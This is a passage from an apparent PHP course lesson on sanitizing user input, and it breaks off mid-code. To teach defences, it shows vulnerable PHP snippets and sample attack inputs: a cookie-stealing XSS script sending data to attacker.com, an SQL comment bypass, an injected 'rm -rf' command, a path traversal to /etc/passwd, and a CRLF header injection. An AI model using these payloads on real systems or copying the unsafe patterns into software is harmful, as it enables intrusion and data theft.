<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
<!-- SEO Meta Tags -->
<title>Sanitizing User Input - PHP WordPress Course</title>
<meta content="Secure user input sanitization methods." name="description"/>
<meta content="PHP, WordPress, web development, sanitizing, user, input" name="keywords"/>
<meta content="PHP WordPress Course" name="author"/>
<!-- Favicon -->
<link href="/favicon.png" rel="icon" type="image/png"/>
<link href="/favicon.png" rel="apple-touch-icon"/>
<!-- CSS -->
<link href="/assets/css/main.css" rel="stylesheet"/><link href="/assets/css/sidebar-enhanced.css" rel="stylesheet"/><link href="/assets/css/sidebar-toggle.css" rel="stylesheet"/>
</head>
<body>
<!-- Skip to main content -->
<a class="sr-only" href="#main-content">Skip to main content</a>
<div class="page-wrapper">
<!-- Header -->
<header class="site-header" role="banner">
<div class="header-container">
<div class="site-branding">
<a class="site-logo" href="/">
<h1 class="site-title">PHP WordPress Development</h1>
</a>
</div>
<nav aria-label="Main navigation" class="main-navigation" role="navigation">
<button aria-expanded="false" aria-label="Toggle navigation" class="mobile-menu-btn">
<span></span>
<span></span>
<span></span>
</button>
<div class="nav-menu">
<ul class="nav-list">
<li class="nav-item"><a class="nav-link" href="/">Home</a></li>
<li class="nav-item dropdown">
<button aria-haspopup="true" class="nav-link dropdown-toggle active">Modules</button>
<div class="dropdown-menu">
<a class="dropdown-item" href="/module1.html">Module 1: Web Fundamentals</a>
<a class="dropdown-item active" href="/module2.html">Module 2: PHP Fundamentals</a>
<a class="dropdown-item" href="/module3.html">Module 3: MySQL Database</a>
<a class="dropdown-item" href="/module4.html">Module 4: WordPress &amp; Docker</a>
<a class="dropdown-item" href="/module5.html">Module 5: Theme Development</a>
<a class="dropdown-item" href="/module6.html">Module 6: Plugin Development</a>
<a class="dropdown-item" href="/module7.html">Module 7: Advanced WordPress</a>
<a class="dropdown-item" href="/module8.html">Module 8: Deployment</a>
<a class="dropdown-item" href="/module9.html">Module 9: Final Project</a>
</div>
</li>
<li class="nav-item"><a class="nav-link" href="/resources.html">Resources</a></li>
<li class="nav-item"><a class="nav-link" href="/about.html">About</a></li>
</ul>
</div>
</nav>
<div class="search-container">
<div class="search-input-wrapper">
<svg class="search-icon" fill="currentColor" height="20" viewbox="0 0 20 20" width="20">
<path clip-rule="evenodd" d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" fill-rule="evenodd"></path>
</svg>
<input aria-label="Search" class="search-input" placeholder="Search lessons..." type="search"/>
</div>
<div class="search-results"></div>
</div>
</div>
</header>
<!-- Progress Bar -->
<div class="progress-container">
<div class="progress-header">
<h2 class="progress-title">Course Progress</h2>
<span class="progress-text">Loading...</span>
</div>
<div class="progress-bar">
<div class="progress-bar-fill">
<span class="progress-bar-text"></span>
</div>
</div>
</div>
<!-- Breadcrumb -->
<nav aria-label="Breadcrumb" class="breadcrumb container">
<ol class="breadcrumb-list">
<li class="breadcrumb-item">
<a href="/">Home</a>
<span class="breadcrumb-separator">/</span>
</li>
<li class="breadcrumb-item">
<a href="/module2.html">Module 2</a>
<span class="breadcrumb-separator">/</span>
</li>
<li class="breadcrumb-item">
<span aria-current="page">Sanitizing User Input</span>
</li>
</ol>
</nav>
<!-- Main Content -->
<main class="main-content" id="main-content" role="main">
<div class="container">
<div class="content-with-sidebar">
<!-- Sidebar -->
<aside class="sidebar">

<div class="sidebar-nav">
<h3 class="sidebar-title">Module 2: PHP Fundamentals</h3>
<div class="sidebar-section">
<h4 class="sidebar-section-title">Session 7</h4>
<ul class="sidebar-menu">
<li><a class="sidebar-link" href="/02module/php_html_forms_review.html">HTML Forms Review</a></li>
<li><a class="sidebar-link" href="/02module/php_get_vs_post_methods.html">GET vs POST</a></li>
<li><a class="sidebar-link" href="/02module/php_accessing_form_data_get_post.html">Accessing Form Data</a></li>
<li><a class="sidebar-link" href="/02module/php_form_validation_techniques.html">Form Validation</a></li>
<li class="active"><a class="sidebar-link active" href="/02module/php_sanitizing_user_input.html">Sanitizing Input</a></li>
<li><a class="sidebar-link" href="/02module/php_file_uploads.html">File Uploads</a></li>
<li><a class="sidebar-link" href="/02module/homework_create_contact_form_validation.html">Homework: Contact Form</a></li>
</ul>
</div>
<div class="sidebar-section">
<h4 class="sidebar-section-title">Quick Links</h4>
<ul class="sidebar-menu">
<li><a class="sidebar-link" href="/module2.html">Module Overview</a></li>
<li><a class="sidebar-link prev-session" href="/02module/php_function_declaration_and_calling.html">← Prev: Session 6: Functions</a></li>
<li><a class="sidebar-link next-session" href="/02module/php_oop_concepts.html">Next: Session 8: OOP Intro →</a></li>
<li><a class="sidebar-link" href="/module1.html">← Previous Module</a></li>
<li><a class="sidebar-link" href="/module3.html">Next Module →</a></li>
<li><a class="sidebar-link" href="/resources.html">Resources</a></li>
</ul>
</div>
</div></aside>
<!-- Main Lesson Content -->
<article class="lesson-content">
<header class="lesson-header">
<h1>Sanitizing User Input</h1>
<div class="lesson-meta">
<div class="lesson-meta-item">
<svg fill="currentColor" height="20" width="20">
<path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
</svg>
<span>Duration: 45 minutes</span>
</div>
<div class="lesson-meta-item">
<svg fill="currentColor" height="20" width="20">
<path d="M12 14l9-5-9-5-9 5 9 5z"></path>
</svg>
<span>Module 2: Working with Forms</span>
</div>
</div>
</header>
<!-- Learning Objectives -->
<div class="lesson-objectives">
<h2>Learning Objectives</h2>
<ul>
<li>Master PHP programming concepts</li>
<li>Write clean, maintainable code</li>
<li>Apply best practices</li>
<li>Build dynamic applications</li>
</ul>
</div>
<!-- Lesson Body -->
<div class="lesson-body">
<section class="intro">
            <h2>Why Sanitization Matters</h2>
            <p>Sanitizing user input is a critical security practice in web development. While validation ensures data meets expected criteria, sanitization ensures that data is safe to use in your application. Proper sanitization prevents malicious attacks like Cross-Site Scripting (XSS), SQL injection, and other security vulnerabilities.</p>
            
            <div class="analogy">
                <h3>The Kitchen Hygiene Analogy</h3>
                <p>Think of sanitization like kitchen hygiene:</p>
                <ul>
                    <li><strong>Validation</strong> is like checking if ingredients are appropriate for your recipe (e.g., verifying that mushrooms are edible varieties).</li>
                    <li><strong>Sanitization</strong> is like washing those ingredients to remove dirt, bacteria, or pesticides before cooking.</li>
                    <li><strong>Different cooking contexts</strong> require different levels of cleanliness, just as different parts of your application require different types of sanitization.</li>
                    <li><strong>Cross-contamination</strong> in a kitchen can make people sick, just as unsanitized data can "infect" your database or output.</li>
                </ul>
                <p>Just as a professional chef would never skip washing ingredients, a professional developer should never skip sanitizing user input.</p>
            </div>
            
            <div class="validation-vs_sanitization">
                <h3>Validation vs. Sanitization</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Aspect</th>
                            <th>Validation</th>
                            <th>Sanitization</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Purpose</td>
                            <td>Ensures data meets expected criteria</td>
                            <td>Makes data safe for use in specific contexts</td>
                        </tr>
                        <tr>
                            <td>Action</td>
                            <td>Accepts or rejects data</td>
                            <td>Modifies data by removing or encoding unsafe parts</td>
                        </tr>
                        <tr>
                            <td>When to use</td>
                            <td>Before accepting user input</td>
                            <td>Before using data in a specific context</td>
                        </tr>
                        <tr>
                            <td>Example</td>
                            <td>"Email must contain @"</td>
                            <td>Convert "&lt;script&gt;" to "&amp;lt;script&amp;gt;"</td>
                        </tr>
                        <tr>
                            <td>Focus</td>
                            <td>Business rules and data quality</td>
                            <td>Security and system integrity</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </section>

        <section class="common-vulnerabilities">
            <h2>Common Security Vulnerabilities</h2>
            <p>Understanding what we're protecting against helps us implement more effective sanitization. Here are the most common vulnerabilities that proper sanitization prevents:</p>
            
            <div class="mermaid-diagram">
                <h3>Web Application Vulnerabilities</h3>
                <div class="mermaid">
flowchart TD
    A[User Input] --> B{Sanitization?}
    B -->|No| C[Vulnerabilities]
    B -->|Yes| D[Secure Application]
    
    C --> E[XSS - Cross-Site Scripting]
    C --> F[SQL Injection]
    C --> G[Command Injection]
    C --> H[CSRF - Cross-Site Request Forgery]
    C --> I[Path Traversal]
    C --> J[Header Injection]
                </div>
            </div>
            
            <div class="vulnerabilities-explained">
                <h3>XSS (Cross-Site Scripting)</h3>
                <p>XSS attacks occur when an attacker injects malicious client-side scripts into web pages viewed by other users.</p>
                
                <h4>Example of XSS Vulnerability:</h4>
                <pre><code>&lt;!-- Vulnerable Comment Display --&gt;
&lt;?php
// UNSAFE CODE - DO NOT USE
$comment = $_POST['comment'];
echo "User Comment: " . $comment;
?&gt;

&lt;!-- If a user submits this as a comment: --&gt;
&lt;script&gt;document.location='https://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;

&lt;!-- It would be rendered as: --&gt;
User Comment: &lt;script&gt;document.location='https://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;

&lt;!-- The script would execute when other users view the comment, 
     potentially stealing their session cookies. --&gt;</code></pre>
                
                <h3>SQL Injection</h3>
                <p>SQL injection occurs when untrusted data is inserted into SQL queries, potentially allowing attackers to execute arbitrary database commands.</p>
                
                <h4>Example of SQL Injection Vulnerability:</h4>
                <pre><code>&lt;?php
// UNSAFE CODE - DO NOT USE
$username = $_POST['username'];
$password = $_POST['password'];

// Vulnerable query construction
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($connection, $query);

// If attacker enters username: admin' --
// The query becomes:
// SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
// The -- makes the rest of the query a comment, allowing login as admin without a password
?&gt;</code></pre>
                
                <h3>Command Injection</h3>
                <p>Command injection allows attackers to execute arbitrary system commands on the host operating system.</p>
                
                <h4>Example of Command Injection Vulnerability:</h4>
                <pre><code>&lt;?php
// UNSAFE CODE - DO NOT USE
$filename = $_GET['filename'];
system("ls -la " . $filename);

// If attacker uses filename: "; rm -rf /important-files; echo "
// The command becomes:
// ls -la ; rm -rf /important-files; echo ""
// This executes three commands instead of one, with the middle command deleting files
?&gt;</code></pre>
                
                <h3>Path Traversal</h3>
                <p>Path traversal (directory traversal) attacks aim to access files and directories outside the intended file system path.</p>
                
                <h4>Example of Path Traversal Vulnerability:</h4>
                <pre><code>&lt;?php
// UNSAFE CODE - DO NOT USE
$file = $_GET['file'];
include('/var/www/app/public/' . $file);

// If attacker sets file to: ../../../../../../etc/passwd
// The path becomes:
// /var/www/app/public/../../../../../../etc/passwd
// Which resolves to /etc/passwd, potentially exposing system files
?&gt;</code></pre>
                
                <h3>Header Injection</h3>
                <p>HTTP header injection occurs when unsanitized user input is included in HTTP response headers, potentially leading to response splitting attacks.</p>
                
                <h4>Example of Header Injection Vulnerability:</h4>
                <pre><code>&lt;?php
// UNSAFE CODE - DO NOT USE
$redirect = $_GET['url'];
header("Location: " . $redirect);

// If attacker uses url: http://example.com%0D%0ASet-Cookie:%20malicious=1
// The header becomes:
// Location: http://example.com
// Set-Cookie: malicious=1
// This injects an additional header that sets a cookie
?&gt;</code></pre>
            </div>
        </section>

        <section class="php-sanitization">
            <h2>PHP Sanitization Functions</h2>
            <p>PHP provides several built-in functions for sanitizing different types of data. Using these functions appropriately helps prevent security vulnerabilities.</p>
            
            <div class="basic-sanitization">
                <h3>Basic PHP Sanitization Functions</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Function</th>
                            <th>Purpose</th>
                            <th>Example</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>htmlspecialchars()</code></td>
                            <td>Converts special characters to HTML entities</td>
                            <td><code>$safe_text = htmlspecialchars($user_input);</code></td>
                        </tr>
                        <tr>
                            <td><code>htmlentities()</code></td>
                            <td>Converts all applicable characters to HTML entities</td>
                            <td><code>$safe_html = htmlentities($user_input);</code></td>
                        </tr>
                        <tr>
                            <td><code>strip_tags()</code></td>
                            <td>Removes HTML and PHP tags</td>
                            <td><code>$text_only = strip_tags($html_content);</code></td>
                        </tr>
                        <tr>
                            <td><code>filter_var()</code></td>
                            <td>Filters a variable with a specified filter</td>
                            <td><code>$email = filter_var($input, FILTER_SANITIZE_EMAIL);</code></td>
                        </tr>
                        <tr>
                            <td><code>mysqli_real_escape_string()</code></td>
                            <td>Escapes special characters for MySQL queries</td>
                            <td><code>$safe_input = mysqli_real_escape_string($conn, $input);</code></td>
                        </tr>
                        <tr>
                            <td><code>PDO::prepare()</code></td>
                            <td>Prepares SQL statements with placeholders</td>
                            <td><code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");</code></td>
                        </tr>
                        <tr>
                            <td><code>addslashes()</code></td>
                            <td>Escapes quotes with backslashes</td>
                            <td><code>$escaped = addslashes($string);</code></td>
                        </tr>
                        <tr>
                            <td><code>escapeshellarg()</code></td>
                            <td>Escapes shell arguments</td>
                            <td><code>system('ls ' . escapeshellarg($directory));</code></td>
                        </tr>
                        <tr>
                            <td><code>escapeshellcmd()</code></td>
                            <td>Escapes shell commands</td>
                            <td><code>system(escapeshellcmd($command));</code></td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="filter-functions">
                <h3>Using PHP Filter Functions</h3>
                <p>The <code>filter_var()</code> and <code>filter_input()</code> functions provide a unified way to sanitize different types of data.</p>
                
                <h4>Common Filter Types:</h4>
                <table>
                    <thead>
                        <tr>
                            <th>Filter</th>
                            <th>Purpose</th>
                            <th>Example</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>FILTER_SANITIZE_EMAIL</code></td>
                            <td>Remove illegal characters from email addresses</td>
                            <td><code>$email = filter_var($input, FILTER_SANITIZE_EMAIL);</code></td>
                        </tr>
                        <tr>
                            <td><code>FILTER_SANITIZE_URL</code></td>
                            <td>Remove illegal characters from URLs</td>
                            <td><code>$url = filter_var($input, FILTER_SANITIZE_URL);</code></td>
                        </tr>
                        <tr>
                            <td><code>FILTER_SANITIZE_NUMBER_INT</code></td>
                            <td>Remove everything except digits and plus/minus signs</td>
                            <td><code>$int = filter_var($input, FILTER_SANITIZE_NUMBER_INT);</code></td>
                        </tr>
                        <tr>
                            <td><code>FILTER_SANITIZE_NUMBER_FLOAT</code></td>
                            <td>Remove everything except digits, plus/minus signs, and optionally .,eE</td>
                            <td><code>$float = filter_var($input, FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);</code></td>
                        </tr>
                        <tr>
                            <td><code>FILTER_SANITIZE_FULL_SPECIAL_CHARS</code></td>
                            <td>Equivalent to htmlspecialchars() with ENT_QUOTES flag</td>
                            <td><code>$text = filter_var($input, FILTER_SANITIZE_FULL_SPECIAL_CHARS);</code></td>
                        </tr>
                    </tbody>
                </table>
                
                <h4>Example of filter_var() Usage:</h4>
                <pre><code>&lt;?php
// Sanitizing different types of input
$email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
$url = filter_var($_POST['website'], FILTER_SANITIZE_URL);
$integer = filter_var($_POST['age'], FILTER_SANITIZE_NUMBER_INT);

// Verify after sanitizing
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "Valid email format: " . $email;
} else {
    echo "Invalid email format after sanitization";
}
?&gt;</code></pre>
                
                <h4>Using filter_input() for Direct Superglobal Access:</h4>
                <pre><code>&lt;?php
// Sanitizing and filtering directly from superglobals
$email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
$url = filter_input(INPUT_GET, 'website', FILTER_SANITIZE_URL);

// Combined sanitization and validation
$age = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT, [
    'options' => [
        'default' => 0,
        'min_range' => 1,
        'max_range' => 120
    ]
]);

// Handling the result
if ($age === false) {
    echo "Invalid age or out of allowed range";
} else {
    echo "Age: " . $age;
}
?&gt;</code></pre>
            </div>
        </section>

        <section class="context-specific_sanitization">
            <h2>Context-Specific Sanitization</h2>
            <p>Different contexts require different sanitization approaches. The same data might need different treatment depending on where it's being used.</p>
            
            <div class="svg-diagram">
                <h3>Context-Sensitive Sanitization</h3>
                <svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg">
                    <!-- User Input -->
                    <rect x="350" y="20" width="100" height="40" rx="5" fill="#f0f0f0" stroke="#333" stroke-width="2"/>
                    <text x="400" y="45" text-anchor="middle" font-family="Arial" font-size="14">User Input</text>
                    
                    <!-- Arrows from input -->
                    <path d="M350 40 L250 100" stroke="#333" stroke-width="2" fill="none"/>
                    <path d="M400 60 L400 100" stroke="#333" stroke-width="2" fill="none"/>
                    <path d="M450 40 L550 100" stroke="#333" stroke-width="2" fill="none"/>
                    <path d="M350 40 L150 100" stroke="#333" stroke-width="2" fill="none"/>
                    <path d="M450 40 L650 100" stroke="#333" stroke-width="2" fill="none"/>
                    
                    <!-- Context boxes -->
                    <rect x="100" y="100" width="100" height="40" rx="5" fill="#e6f7ff" stroke="#1890ff" stroke-width="2"/>
                    <text x="150" y="125" text-anchor="middle" font-family="Arial" font-size="14">HTML</text>
                    
                    <rect x="200" y="100" width="100" height="40" rx="5" fill="#f6ffed" stroke="#52c41a" stroke-width="2"/>
                    <text x="250" y="125" text-anchor="middle" font-family="Arial" font-size="14">SQL</text>
                    
                    <rect x="350" y="100" width="100" height="40" rx="5" fill="#fff2e8" stroke="#fa8c16" stroke-width="2"/>
                    <text x="400" y="125" text-anchor="middle" font-family="Arial" font-size="14">URLs</text>
                    
                    <rect x="500" y="100" width="100" height="40" rx="5" fill="#f9f0ff" stroke="#722ed1" stroke-width="2"/>
                    <text x="550" y="125" text-anchor="middle" font-family="Arial" font-size="14">Shell</text>
                    
                    <rect x="600" y="100" width="100" height="40" rx="5" fill="#fcffe6" stroke="#a0d911" stroke-width="2"/>
                    <text x="650" y="125" text-anchor="middle" font-family="Arial" font-size="14">JavaScript</text>
                    
                    <!-- Sanitization methods -->
                    <rect x="75" y="180" width="150" height="80" rx="5" fill="#e6f7ff" stroke="#1890ff" stroke-width="1"/>
                    <text x="150" y="200" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold">HTML Context</text>
                    <text x="150" y="220" text-anchor="middle" font-family="Arial" font-size="11">htmlspecialchars()</text>
                    <text x="150" y="240" text-anchor="middle" font-family="Arial" font-size="11">htmlentities()</text>
                    <text x="150" y="260" text-anchor="middle" font-family="Arial" font-size="11">strip_tags()</text>
                    
                    <rect x="175" y="180" width="150" height="80" rx="5" fill="#f6ffed" stroke="#52c41a" stroke-width="1"/>
                    <text x="250" y="200" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold">SQL Context</text>
                    <text x="250" y="220" text-anchor="middle" font-family="Arial" font-size="11">prepared statements</text>
                    <text x="250" y="240" text-anchor="middle" font-family="Arial" font-size="11">mysqli_real_escape_string()</text>
                    <text x="250" y="260" text-anchor="middle" font-family="Arial" font-size="11">PDO::quote()</text>
                    
                    <rect x="325" y="180" width="150" height="80" rx="5" fill="#fff2e8" stroke="#fa8c16" stroke-width="1"/>
                    <text x="400" y="200" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold">URL Context</text>
                    <text x="400" y="220" text-anchor="middle" font-family="Arial" font-size="11">filter_var(...URL)</text>
                    <text x="400" y="240" text-anchor="middle" font-family="Arial" font-size="11">urlencode()</text>
                    <text x="400" y="260" text-anchor="middle" font-family="Arial" font-size="11">rawurlencode()</text>
                    
                    <rect x="475" y="180" width="150" height="80" rx="5" fill="#f9f0ff" stroke="#722ed1" stroke-width="1"/>
                    <text x="550" y="200" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold">Shell Context</text>
                    <text x="550" y="220" text-anchor="middle" font-family="Arial" font-size="11">escapeshellarg()</text>
                    <text x="550" y="240" text-anchor="middle" font-family="Arial" font-size="11">escapeshellcmd()</text>
                    <text x="550" y="260" text-anchor="middle" font-family="Arial" font-size="11">Avoid shell commands!</text>
                    
                    <rect x="575" y="180" width="150" height="80" rx="5" fill="#fcffe6" stroke="#a0d911" stroke-width="1"/>
                    <text x="650" y="200" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold">JavaScript Context</text>
                    <text x="650" y="220" text-anchor="middle" font-family="Arial" font-size="11">json_encode()</text>
                    <text x="650" y="240" text-anchor="middle" font-family="Arial" font-size="11">encodeURIComponent()</text>
                    <text x="650" y="260" text-anchor="middle" font-family="Arial" font-size="11">HTML escaping</text>
                    
                    <!-- Arrows to secure output -->
                    <path d="M150 260 L250 350" stroke="#333" stroke-width="1" fill="none"/>
                    <path d="M250 260 L300 350" stroke="#333" stroke-width="1" fill="none"/>
                    <path d="M400 260 L350 350" stroke="#333" stroke-width="1" fill="none"/>
                    <path d="M550 260 L400 350" stroke="#333" stroke-width="1" fill="none"/>
                    <path d="M650 260 L450 350" stroke="#333" stroke-width="1" fill="none"/>
                    
                    <!-- Secure output -->
                    <rect x="250" y="350" width="200" height="40" rx="5" fill="#d9f7be" stroke="#52c41a" stroke-width="2"/>
                    <text x="350" y="375" text-anchor="middle" font-family="Arial" font-size="14" font-weight="bold">Secure Application</text>
                </svg>
            </div>
            
            <div class="html-context">
                <h3>HTML Context Sanitization</h3>
                <p>When outputting user data in HTML, you need to prevent XSS attacks by converting special characters to HTML entities.</p>
                
                <h4>Example of HTML Context Sanitization:</h4>
                <pre><code>&lt;?php
// Sanitizing for HTML output
$user_comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');

// Understanding the flags:
// ENT_QUOTES: Converts both double and single quotes
// 'UTF-8': Specifies character encoding

// Now safe to output in HTML
echo "&lt;div class='comment'&gt;" . $user_comment . "&lt;/div&gt;";

// If you need to preserve some HTML tags while sanitizing
$allowed_tags = '&lt;p&gt;&lt;a&gt;&lt;strong&gt;&lt;em&gt;&lt;ul&gt;&lt;ol&gt;&lt;li&gt;';
$rich_comment = strip_tags($_POST['rich_comment'], $allowed_tags);

// Note: strip_tags alone is not sufficient for XSS protection!
// Further sanitization of attributes might be needed
?&gt;</code></pre>
                
                <h4>Common Mistakes to Avoid:</h4>
                <ul>
                    <li>Using <code>strip_tags()</code> alone for XSS protection (doesn't handle attribute-based attacks)</li>
                    <li>Forgetting to specify character encoding</li>
                    <li>Not escaping quotes (using ENT_QUOTES flag)</li>
                    <li>Only sanitizing some HTML contexts but not others (like attributes)</li>
                </ul>
            </div>
            
            <div class="sql-context">
                <h3>SQL Context Sanitization</h3>
                <p>Protecting against SQL injection requires either prepared statements (preferred) or proper escaping of values used in queries.</p>
                
                <h4>Example of SQL Context Sanitization with Prepared Statements:</h4>
                <pre><code>&lt;?php
// Using prepared statements with MySQLi
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND status = ?");
$stmt->bind_param("ss", $username, $status); // "ss" means two strings
$stmt->execute();
$result = $stmt->get_result();

// Using prepared statements with PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND status = :status");
$stmt->execute([
    ':username' => $username,
    ':status' => $status
]);
$result = $stmt->fetchAll();

// If you absolutely cannot use prepared statements (not recommended)
$username = mysqli_real_escape_string($mysqli, $username);
$status = mysqli_real_escape_string($mysqli, $status);
$query = "SELECT * FROM users WHERE username = '$username' AND status = '$status'";
$result = $mysqli->query($query);
?&gt;</code></pre>
                
                <h4>Common Mistakes to Avoid:</h4>
                <ul>
                    <li>Directly inserting variables into SQL queries without preparation or escaping</li>
                    <li>Using outdated mysql_* functions (they're deprecated and removed from PHP 7+)</li>
                    <li>Not escaping all user inputs used in queries</li>
                    <li>Incorrectly typing parameters in prepared statements</li>
                    <li>Not handling numeric data properly (type casting when needed)</li>
                </ul>
            </div>
            
            <div class="urls-context">
                <h3>URL Context Sanitization</h3>
                <p>When working with URLs, proper encoding prevents header injection, open redirects, and other URL-based attacks.</p>
                
                <h4>Example of URL Context Sanitization:</h4>
                <pre><code>&lt;?php
// Sanitizing a URL parameter
$page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_URL);

// If creating a redirect URL from user input (dangerous, use with caution)
$redirect_url = filter_var($_GET['redirect'], FILTER_SANITIZE_URL);

// Validate the URL after sanitization (very important!)
if (filter_var($redirect_url, FILTER_VALIDATE_URL)) {
    // Additional validation: Only allow specific domains
    $parsed_url = parse_url($redirect_url);
    $allowed_domains = ['example.com', 'subdomain.example.com'];
    
    if (in_array($parsed_url['host'], $allowed_domains)) {
        header("Location: " . $redirect_url);
        exit;
    }
}

// When adding parameters to URLs
$params = [
    'name' => $user_name,
    'query' => $search_term
];

$safe_url = 'search.php?' . http_build_query($params);
// Result: search.php?name=John+Doe&query=search+term
?&gt;</code></pre>
                
                <h4>Common Mistakes to Avoid:</h4>
                <ul>
                    <li>Not validating URLs after sanitization</li>
                    <li>Creating open redirects (always whitelist allowed domains)</li>
                    <li>Manually constructing query strings (use http_build_query() instead)</li>
                    <li>Not checking URL protocols (restrict to http:// and https://)</li>
                    <li>Not encoding URL components in JavaScript contexts</li>
                </ul>
            </div>
            
            <div class="javascript-context">
                <h3>JavaScript Context Sanitization</h3>
                <p>When including user data in JavaScript, proper encoding prevents JavaScript injection attacks.</p>
                
                <h4>Example of JavaScript Context Sanitization:</h4>
                <pre><code>&lt;?php
// User data to be included in JavaScript
$username = $_POST['username'];
$preferences = [
    'theme' => $_POST['theme'],
    'language' => $_POST['language']
];

// UNSAFE way (DO NOT USE):
echo "&lt;script&gt;
";
echo "let username = '" . $username . "';
"; // Vulnerable to JS injection
echo "&lt;/script&gt;";

// SAFE way - using json_encode():
$safe_username = json_encode($username);
$safe_preferences = json_encode($preferences);
?&gt;

&lt;script&gt;
// Safe output in JavaScript context
let username = &lt;?php echo $safe_username; ?&gt;;
let preferences = &lt;?php echo $safe_preferences; ?&gt;;

// Alternatively, use data attributes and access via JavaScript
&lt;/script&gt;

&lt;!-- Another safe approach using data attributes --&gt;
&lt;div id="user-info" 
     data-username="&lt;?php echo htmlspecialchars($username); ?&gt;"
     data-preferences="&lt;?php echo htmlspecialchars(json_encode($preferences)); ?&gt;"&gt;
&lt;/div&gt;

&lt;script&gt;
// Get data from attributes
const userInfo = document.getElementById('user-info');
const username = userInfo.dataset.username;
const preferences = JSON.parse(userInfo.dataset.preferences);
&lt;/script&gt;</code></pre>
                
                <h4>Common Mistakes to Avoid:</h4>
                <ul>
                    <li>Directly inserting PHP variables into JavaScript strings</li>
                    <li>Forgetting that HTML context and JavaScript context require different sanitization</li>
                    <li>Not encoding nested structures properly</li>
                    <li>Handcrafting JSON instead of using json_encode()</li>
                    <li>Not escaping HTML attributes when using data attributes</li>
                </ul>
            </div>
            
            <div class="shell-context">
                <h3>Shell Command Context</h3>
                <p>When executing shell commands with user input (which should be avoided if possible), proper escaping is essential to prevent command injection.</p>
                
                <h4>Example of Shell Command Sanitization:</h4>
                <pre><code>&lt;?php
// NEVER use user input directly in shell commands
// UNSAFE (DO NOT USE):
system("ping " . $_GET['host']); // Vulnerable to command injection

// SAFER (but still try to avoid shell commands with user input):
$host = escapeshellarg($_GET['host']);
system("ping " . $host);

// BEST: Use PHP native functions instead of shell commands when possible
if (filter_var($_GET['host'], FILTER_VALIDATE_IP)) {
    // Use fsockopen or other PHP functions instead of system ping
}

// When you must use exec, capture output safely
$command = 'ls ' . escapeshellarg($directory);
$output = [];
$return_var = null;
exec($command, $output, $return_var);

// For shell arguments vs. commands:
// escapeshellarg() - for individual arguments
// escapeshellcmd() - for entire command strings
?&gt;</code></pre>
                
                <h4>Common Mistakes to Avoid:</h4>
                <ul>
                    <li>Using shell commands when PHP native functions would work</li>
                    <li>Confusing escapeshellarg() and escapeshellcmd()</li>
                    <li>Not validating input before using it in shell contexts</li>
                    <li>Disabling safe mode or other PHP security features</li>
                    <li>Not checking return values from shell commands</li>
                </ul>
            </div>
        </section>

        <section class="rich-content">
            <h2>Handling Rich Text Content</h2>
            <p>Sometimes you need to allow certain HTML tags in user input, such as for comment systems or content management systems. This requires special sanitization approaches.</p>
            
            <div class="html-purifier">
                <h3>Using HTML Purifier</h3>
                <p>HTML Purifier is a standards-compliant HTML filter library that helps you prevent XSS while allowing certain HTML elements.</p>
                
                <h4>Example of Using HTML Purifier:</h4>
                <pre><code>&lt;?php
// First, install HTML Purifier via Composer:
// composer require ezyang/htmlpurifier

// Basic HTML Purifier usage
require_once 'vendor/autoload.php';

$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean_html = $purifier->purify($_POST['content']);

// Now $clean_html is safe to store in your database or output

// Customizing HTML Purifier configuration
$config = HTMLPurifier_Config::createDefault();

// Allow only specific tags
$config->set('HTML.Allowed', 'p,b,i,strong,em,a[href|title],ul,ol,li,br,span[style]');

// Set link targets
$config->set('HTML.TargetBlank', true);

// Allow some CSS properties
$config->set('CSS.AllowedProperties', 'font,font-size,font-weight,font-style,color,text-align');

// Create purifier with custom config
$purifier = new HTMLPurifier($config);
$clean_html = $purifier->purify($_POST['content']);
?&gt;</code></pre>
            </div>
            
            <div class="custom-sanitization">
                <h3>Creating Custom Sanitization Functions</h3>
                <p>Sometimes you need to create custom sanitization for specific application requirements.</p>
                
                <h4>Example of Custom Sanitization Function:</h4>
                <pre><code>&lt;?php
/**
 * Sanitize HTML content while allowing specific tags and attributes
 *
 * @param string $content The HTML content to sanitize
 * @return string Sanitized HTML
 */
function sanitize_rich_content($content) {
    // Define allowed HTML tags and attributes
    $allowed_tags = [
        'p' => ['class', 'id', 'style'],
        'a' => ['href', 'title', 'class', 'id', 'target'],
        'strong' => [],
        'em' => [],
        'ul' => ['class', 'id'],
        'ol' => ['class', 'id'],
        'li' => ['class', 'id'],
        'h2' => ['class', 'id'],
        'h3' => ['class', 'id'],
        'br' => [],
